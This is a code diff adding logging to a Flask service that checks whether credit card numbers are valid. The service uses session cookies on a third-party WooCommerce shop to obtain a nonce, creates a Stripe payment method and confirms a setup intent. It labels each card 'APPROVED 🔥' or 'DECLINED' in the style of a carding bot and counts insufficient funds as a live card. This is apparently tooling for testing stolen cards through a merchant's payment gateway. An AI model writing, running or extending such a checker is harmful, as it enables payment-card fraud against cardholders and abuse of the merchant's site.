@@ -36,6 +36,18 @@ COOKIES = {
     'PHPSESSID': 'n05fqig3paubs7m4nail5ck9sn',
 }
 
+import logging
+
+# Configure Logging
+logging.basicConfig(
+    level=logging.INFO,
+    format='%(asctime)s - %(levelname)s - %(message)s',
+    handlers=[
+        logging.StreamHandler()
+    ]
+)
+logger = logging.getLogger(__name__)
+
 def parseX(data, start, end):
     try:
         star = data.index(start) + len(start)
@@ -46,6 +58,10 @@ def parseX(data, start, end):
 
 @app.route('/check', methods=['GET', 'POST'])
 def check_card():
+    # Log Incoming Request
+    client_ip = request.remote_addr
+    logger.info(f"🔔 NEW REQUEST from {client_ip}")
+
     # Handle POST (JSON) and GET (Query Params)
     try:
         if request.method == 'POST':
@@ -67,7 +83,16 @@ def check_card():
             # GET Request
             folder_cc = request.args.get('cc') or request.args.get('card')
             
+        if folder_cc:
+            # Mask CC for logs
+            try:
+                masked_cc = f"{folder_cc[:6]}******{folder_cc[-4:]}"
+                logger.info(f"💳 Checking Card: {masked_cc}")
+            except:
+                logger.info(f"💳 Checking Card: {folder_cc}")
+                
     except Exception as e:
+        logger.error(f"❌ Params Error: {str(e)}")
         return jsonify({"status": "error", "message": f"Request Error: {str(e)}"})
     
     if not folder_cc:
@@ -102,10 +127,11 @@ def check_card():
         "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",
         "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/143.0.0.0 Safari/537.36",
     }
-    
+    logger.info("🔄 Step 1: Connecting to Site for Nonce...")
     try:
         req1 = session.get(f"{DOMAIN}/my-account/add-payment-method/", headers=headers, timeout=10)
     except Exception as e:
+        logger.error(f"❌ Connection Failed: {e}")
         return jsonify({
             "status": "error",
             "message": f"❌ CONNECTION ERROR"
@@ -113,6 +139,7 @@ def check_card():
 
     # Error Detection
     if req1.status_code == 403:
+        logger.warning("❌ Cookies Expired (403)")
         return jsonify({
             "status": "declined",
             "message": "🚫 COOKIES EXPIRED - Access Denied (403)",
@@ -120,6 +147,7 @@ def check_card():
         })
     
     if "wp-login.php" in req1.text or "login" in req1.text.lower()[:500]:
+        logger.warning("❌ Cookies Expired (Redirect to Login)")
         return jsonify({
             "status": "declined",
             "message": "🔐 COOKIES EXPIRED - Redirected to login",
@@ -129,6 +157,7 @@ def check_card():
     setup_intent_nonce = parseX(req1.text, '"createAndConfirmSetupIntentNonce":"', '"')
     
     if setup_intent_nonce == "None":
+        logger.warning("❌ Nonce Not Found")
         return jsonify({
             "status": "declined",
             "message": "⚠️ NO NONCE - Update Cookies",
@@ -138,6 +167,7 @@ def check_card():
     # ==========================================
     # STEP 2: Create Stripe PM
     # ==========================================
+    logger.info("🔄 Step 2: Creating Stripe Payment Method...")
     headers2 = {
         "accept": "application/json",
         "content-type": "application/x-www-form-urlencoded",
@@ -173,6 +203,7 @@ def check_card():
         except:
             err = "Stripe Error"
         
+        logger.error(f"❌ Stripe PM Failed: {err}")
         return jsonify({
             "status": "declined",
             "message": f"Stripe Declined: {err}",
@@ -180,7 +211,9 @@ def check_card():
         })
 
     pm_id = req2.json().get('id')
+    logger.info(f"✅ PM Created: {pm_id}")
     if not pm_id:
+         logger.error("❌ PM ID Missing")
          return jsonify({
             "status": "error",
             "message": "No PM ID",
@@ -190,6 +223,7 @@ def check_card():
     # ==========================================
     # STEP 3: Charging
     # ==========================================
+    logger.info("🔄 Step 3: Confirming Setup Intent (Charging)...")
     headers3 = {
         "accept": "*/*",
         "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
@@ -212,10 +246,12 @@ def check_card():
     # RESPONSE HANDLING
     # ==========================================
     result_text = req3.text.strip()
+    logger.info(f"✅ Gateway Reponse: {result_text}")
     print(f"✅ RAW GATEWAY RESPONSE: {result_text}")
     
     # Check for empty/invalid response (cookies expired)
     if result_text == "0" or result_text == "" or len(result_text) < 5:
+        logger.warning("❌ Invalid/Empty Response")
         return jsonify({
             "status": "declined",
             "message": "🔐 COOKIES EXPIRED - Invalid Session",
@@ -225,9 +261,11 @@ def check_card():
     if '"success":true' in result_text:
         msg = f"✅ ᴀᴘᴘʀᴏᴠᴇᴅ 🔥\n𝗖𝗖: {folder_cc}\n𝗚𝗮𝘁𝗲𝘄𝗮𝘆: Infinite Auto Werks\n𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲: Authorized"
         status = "approved"
+        logger.info("✅ Result: APPROVED")
     elif "insufficient" in result_text.lower():
         msg = f"✅ ᴀᴘᴘʀᴏᴠᴇᴅ 🔥 (CVV)\n𝗖𝗖: {folder_cc}\n𝗚𝗮𝘁𝗲𝘄𝗮𝘆: Infinite Auto Werks\n𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲: Insufficient Funds"
         status = "approved"
+        logger.info("✅ Result: APPROVED (Insufficient)")
     else:
         # Extract Error
         try:
@@ -246,10 +284,11 @@ def check_card():
 
         msg = f"❌ ᴅᴇᴄʟɪɴᴇᴅ ❌\n𝗖𝗖: {folder_cc}\n𝗘𝗿𝗿𝗼𝗿: {error_msg}"
         status = "declined"
+        logger.info(f"❌ Result: DECLINED ({error_msg})")
 
     return jsonify({
         "status": status,
-        "response": error_msg if status == "declined" else "Authorized",
+        "message": error_msg if status == "declined" else "Authorized",
         "bot_message": msg
     })
 
